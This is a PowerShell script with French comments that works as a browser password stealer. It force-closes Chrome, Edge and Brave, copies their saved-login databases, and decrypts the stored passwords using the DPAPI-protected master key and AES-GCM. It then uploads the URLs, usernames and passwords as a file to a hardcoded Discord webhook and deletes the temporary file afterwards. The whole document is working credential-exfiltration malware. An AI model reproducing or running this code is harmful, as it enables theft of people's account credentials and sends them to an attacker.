$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

# Kill browsers
taskkill /F /IM chrome.exe,msedge.exe,brave.exe 2>$null
Start-Sleep -Seconds 2

# Fonction de déchiffrement
Add-Type -AssemblyName System.Security
function Get-DecryptedPasswords {
    param($browserPath, $browserName)
    
    $loginDataPath = "$browserPath\Login Data"
    $localStatePath = "$browserPath\..\Local State"
    
    if (!(Test-Path $loginDataPath)) { return @() }
    
    # Copier temporairement la DB
    $tempDb = "$env:TEMP\tempLogin.db"
    Copy-Item $loginDataPath $tempDb -Force -EA 0
    
    # Lire la clé de chiffrement
    if (Test-Path $localStatePath) {
        $localState = Get-Content $localStatePath | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)] # Enlever "DPAPI"
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    }
    
    # Lire SQLite
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()
    
    $results = @()
    while ($reader.Read()) {
        $encryptedPassword = [byte[]]$reader["password_value"]
        
        if ($encryptedPassword.Length -gt 0) {
            try {
                # Déchiffrement AES-GCM
                $nonce = $encryptedPassword[3..14]
                $ciphertext = $encryptedPassword[15..($encryptedPassword.Length-17)]
                $tag = $encryptedPassword[($encryptedPassword.Length-16)..($encryptedPassword.Length-1)]
                
                $aes = New-Object System.Security.Cryptography.AesGcm
                $decrypted = New-Object byte[] $ciphertext.Length
                $aes.Decrypt($key, $nonce, $ciphertext, $tag, $decrypted)
                
                $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                
                $results += [PSCustomObject]@{
                    Browser = $browserName
                    URL = $reader["origin_url"]
                    Username = $reader["username_value"]
                    Password = $password
                }
            } catch {}
        }
    }
    
    $reader.Close()
    $conn.Close()
    Remove-Item $tempDb -Force -EA 0
    
    return $results
}

# Télécharger SQLite si nécessaire
if (!(Get-Command -Name 'sqlite3.exe' -EA 0)) {
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (!(Test-Path $sqliteDll)) {
        Invoke-WebRequest -Uri "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip" -OutFile "$env:TEMP\sqlite.zip"
        Expand-Archive "$env:TEMP\sqlite.zip" "$env:TEMP\sqlite" -Force
        Copy-Item "$env:TEMP\sqlite\System.Data.SQLite.dll" $sqliteDll -Force
    }
    Add-Type -Path $sqliteDll
}

# Extraire les mots de passe
$allPasswords = @()
$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" "Chrome"
$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" "Edge"
$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default" "Brave"

# Formater en texte
$output = "=== PASSWORDS FROM $env:COMPUTERNAME ===`n`n"
foreach ($p in $allPasswords) {
    $output += "[$($p.Browser)] $($p.URL)`n"
    $output += "Username: $($p.Username)`n"
    $output += "Password: $($p.Password)`n`n"
}

# Envoyer via Discord
$output | Out-File "$env:TEMP\passwords.txt" -Encoding UTF8
curl.exe -F "file=@$env:TEMP\passwords.txt" -F "content=**Passwords from $env:COMPUTERNAME**" $wh

# Cleanup
Remove-Item "$env:TEMP\passwords.txt" -Force -EA 0
